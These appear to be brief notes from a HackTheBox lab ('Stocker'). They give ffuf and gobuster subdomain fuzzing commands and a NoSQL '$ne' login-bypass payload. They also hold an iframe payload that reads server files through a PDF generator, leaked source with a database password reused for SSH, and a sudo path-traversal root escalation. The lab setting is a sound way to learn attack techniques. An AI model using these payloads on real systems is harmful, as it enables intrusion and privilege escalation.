# stocker

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

```
ffuf -u http://stocker.htb -w ../bitquark-subdomains-top100000.txt -H "HOST: FUZZ.stocker.htb" -mc 302
```

*[image unavailable]*

*[image unavailable]*

```
ffuf -u http://dev.stocker.htb/login -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
```

*[image unavailable]*

*[image unavailable]*

```
ffuf -u http://dev.stocker.htb/login -c -w /home/htb-theblackcat/my_data/NoSQL.txt -X POST -d '{"username":{"$ne":"null"},"password":{"$ne":"null"}}' -H 'Content-Type: application/json'
```

```
gobuster vhost -u stocker.htb -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --append-domain
```

https://github.com/OWASP/Amass/blob/master/examples/wordlists/subdomains-top1mil-20000.txt

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

http://dev.stocker.htb/api/po/63f10bf08708b73de16f2c16

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

user angoose

```
"<iframe src=file:///var/www/dev/index.js height=1000px width=800px></iframe>"
```

*[image unavailable]*

```js
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
  session({
    secret: randomBytes(32).toString("hex"),
    resave: false,
    saveUninitialized: true,
    store: MongoStore.create({
      mongoUrl: dbURI,
    }),
  })
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
  return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
  if (!req.session.user) return res.json([]);
  const products = await mongoose.model("Product").find();
  return res.json(products);
});
app.get("/login", (req, res) => {
  if (req.session.user) return res.redirect("/stock");
  return res.sendFile(__dirname + "/templates/login.html");
});
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/login?error=login-error");
  // TODO: Implement hashing
  const user = await mongoose.model("User").findOne({ username, password });
  if (!user) return res.redirect("/login?error=login-error");
  req.session.user = user.id;
  console.log(req.session);
  return res.redirect("/stock");
});
app.post("/api/order", async (req, res) => {
  if (!req.session.user) return res.json({});
```

```
angoose
IHeardPassphrasesArePrettySecure
```

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

```
sudo /usr/bin/node /usr/local/scripts/../../../../../home/angoose/escalation.js
```

*[image unavailable]*

effin sticky

*[image unavailable]*
